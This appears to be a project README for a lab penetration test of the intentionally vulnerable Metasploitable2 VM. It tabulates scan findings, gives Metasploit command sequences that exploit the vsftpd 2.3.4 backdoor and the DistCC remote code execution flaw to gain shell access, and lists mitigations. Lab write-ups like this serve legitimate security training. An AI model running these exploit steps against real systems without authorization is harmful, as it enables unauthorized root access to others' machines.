# Penetration Testing on Metasploitable2

## Overview
This project involves conducting penetration testing on the Metasploitable2 virtual machine using **Kali Linux**. The main objective was to identify, analyze and exploit vulnerabilities in web and network services while documenting findings and mitigation strategies.

## Tools Used
- **Metasploitable2**: A vulnerable Linux VM used as the target.
- **Kali Linux**: The attacker machine.
- **Nikto**: Web vulnerability scanner.
- **OpenVAS**: Network vulnerability assessment tool.
- **Metasploit Framework**: Exploitation tool.
- **Nmap**: Network scanner.


## Vulnerabilities Discovered

### **Web Vulnerabilities (Nikto Scan)**
| **Vulnerability** | **CWE ID** | **Description** | **Risk Level** |
|------------------|-----------|----------------|---------------|
| **Clickjacking** | CWE-1021 | X-Frame-Options header missing, allowing UI redress attacks. | Medium |
| **Directory Browsing** | - | Allows browsing of sensitive files that attackers can access. | Medium |

### **Network Vulnerabilities (OpenVAS Scan)**
| **Vulnerability** | **CVE ID** | **Description** | **Risk Level** |
|------------------|-----------|----------------|---------------|
| **DistCC Remote Code Execution (RCE)** | CVE-2004-2687 | Attackers can execute arbitrary commands remotely. | High |
| **vsftpd 2.3.4 Backdoor** | CVE-2011-2523 | Backdoor in vsftpd allows unauthorized root access. | Critical |
| **OpenSSL MITM Attack** | CVE-2014-0224 | SSL/TLS vulnerability allowing encrypted traffic interception. | High |

---

## Exploitation Demonstrations
### **1️⃣ Exploiting vsftpd 2.3.4 Backdoor**
```bash
msfconsole
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOST <Metasploitable_IP>
exploit
whoami  # Confirms root access


### 2️⃣ Exploiting DistCC RCE
msfconsole
use exploit/unix/misc/distcc_exec
set RHOST <Metasploitable_IP>
set LHOST <Attacker_IP>
exploit
whoami  # Confirms access

```

## Security Recommendations
To mitigate these vulnerabilities, the following security measures should be implemented:

### For Web Vulnerabilities:
✅ Enable X-Frame-Options to protect against clickjacking.  
✅ Disable directory listing in Apache/Nginx configurations.  
✅ Implement Content Security Policy (CSP) to control how resources are loaded.  

### For Network Vulnerabilities:
✅ Patch vsftpd 2.3.4 to the latest version.  
✅ Disable unused services like DistCC to minimize attack surface.  
✅ Use strong encryption (TLS 1.2/1.3) instead of outdated OpenSSL versions.  

### General Recommendations:
✅ Use a Web Application Firewall (WAF).  
✅ Regularly scan for vulnerabilities using OpenVAS and Nikto.  
✅ Implement strict access controls and monitoring.  



## Resources
Here are some useful resources for further learning:

- [Metasploitable2 VM](https://sourceforge.net/projects/metasploitable/)
- [Kali Linux](https://www.kali.org/)
- [Metasploit Framework](https://www.rapid7.com/products/metasploit/)
- [Nikto Web Scanner](https://cirt.net/nikto2)
- [OpenVAS Scanner](https://www.openvas.org/)




